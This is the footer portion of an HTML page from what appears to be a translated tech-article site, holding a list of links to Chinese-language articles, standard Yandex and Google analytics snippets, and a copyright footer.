<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN412843/index.html">对太空战的误解</a></li>
<li><a href="../zh-CN412845/index.html">情感分类：情感计算的核心</a></li>
<li><a href="../zh-CN412847/index.html">graphql-优化数据库查询</a></li>
<li><a href="../zh-CN412851/index.html">OutOfMemory和GDI +有时根本不是OutOfMemory</a></li>
<li><a href="../zh-CN412853/index.html">Badoo Techleads集会＃3的视频：关于委派，入职，业务和IT采访</a></li>
<li><a href="../zh-CN412859/index.html">Windows中的两因素身份验证和无证书颁发机构和域的数据加密</a></li>
<li><a href="../zh-CN412861/index.html">为假人创建用户路径图</a></li>
<li><a href="../zh-CN412863/index.html">Dialogflower-适用于Yandex Alice的Google Dialogflow</a></li>
<li><a href="../zh-CN412865/index.html">如何在Sony Xperia XZ2中拍摄运动眼相机</a></li>
<li><a href="../zh-CN412867/index.html">如何通过GCC编译器编译DOS COM文件</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>